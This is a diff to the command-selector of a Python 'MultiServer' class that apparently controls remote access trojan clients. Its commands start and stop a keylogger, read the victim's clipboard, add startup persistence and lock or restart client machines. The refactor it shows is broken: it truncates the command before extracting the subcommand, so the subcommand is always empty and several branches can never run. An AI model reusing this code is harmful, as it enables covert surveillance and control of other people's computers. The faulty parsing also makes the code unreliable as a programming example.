@@ -152,6 +152,7 @@ def errors(ERROR, line=True) -> str:
         except Exception: pass
     return error_msg
 
+
 def shell_print(data) -> None:
     """ Support for printing more characters """
     # Mostly for tree command in Windows
@@ -618,6 +619,8 @@ class MultiServer(object):
     def selector(self, conn, command) -> bool:
         """ Command selector interface """
         # returns True/None
+        command = command[:3].lower()
+        select = command[4:].strip()
         if '--h' in command:
             print(interface_help)
             return
@@ -644,20 +647,20 @@ class MultiServer(object):
         if '--u' in command:
             self.get_info(conn)
             return
-        if command[:3] == '--k':
-            if command[4:].strip() == 'start':
+        if command == '--k':
+            if select == 'start':
                 if self.start_keylogger(conn):
                     print('Started Keylogger')
                 else:
                     print('Keylogger ImportError')
                 return
-            if command[4:].strip() == 'status':
+            if select == 'status':
                 if self.start_keylogger(conn):
                     print('Keylogger Running')
                 else:
                     print('Keylogger is not running.')
                 return
-            if command[4:].strip() == 'stop':
+            if select == 'stop':
                 if self.stop_keylogger(conn):
                     print('Stopped Keylogger')
                 else:
@@ -710,8 +713,7 @@ class MultiServer(object):
             _, output = self.get_clipboard(conn)
             print(output)
             return
-        if command [:3] == '--t':
-            select = command[4:].strip().lower()
+        if command == '--t':
             if select == 'add':
                 result, error = self.add_startup(conn)
                 if result:
@@ -726,8 +728,7 @@ class MultiServer(object):
                 else:
                     print(error)
                 return
-        if command[:3] == '--q':
-            select = command[4:].strip()
+        if command == '--q':
             if select == '1':
                 if self.lock(conn):
                     print('Locked Client Machine')
@@ -742,8 +743,7 @@ class MultiServer(object):
                 print('Restarting Client Machine')
                 self.restart(conn)
                 return True
-        if command[:3] == '--x':
-            command = command[4:].strip()
+        if command == '--x':
             if command == '1':
                 print('Restarting Session...')
                 return self.restart_session(conn)
